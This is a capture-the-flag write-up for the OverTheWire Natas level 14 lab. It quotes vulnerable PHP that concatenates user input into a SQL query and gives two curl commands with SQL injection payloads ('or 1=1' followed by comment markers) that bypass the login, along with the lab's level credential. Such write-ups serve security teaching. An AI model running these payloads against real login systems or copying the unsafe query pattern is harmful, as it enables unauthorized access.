---
category: natas
title: Natas14 - SQL Injection Part 1
---

website: http://natas14.natas.labs.overthewire.org/ (password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1)

In this challenge, it simulates a login page by authenticating a pair of username and password.

From the provided source code, we can see this challenge is all about SQL Injection:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
...
if(mysql_num_rows(mysql_query($query, $link)) > 0) { ...
```

As we can see above, the username and password are inserted into a query string directly and then sent to mysql for execution.

Any of the two curl commands below will work.
Here, the symbol `#` and `-- ` are leading characters for a comment in SQL. Therefore, it will silent the validation of the password.

```shell
$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org/index.php?debug -F 'username=a" or 1=1#' -F 'password=b'
$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org/index.php?debug -F 'username=a" or 1=1-- ' -F 'password=b'
```

Moreover, pay attention to the 2nd command. There is a space after "-\-".
The space <em>is</em> required for mysql, which differs slightly from standard SQL comment syntax.

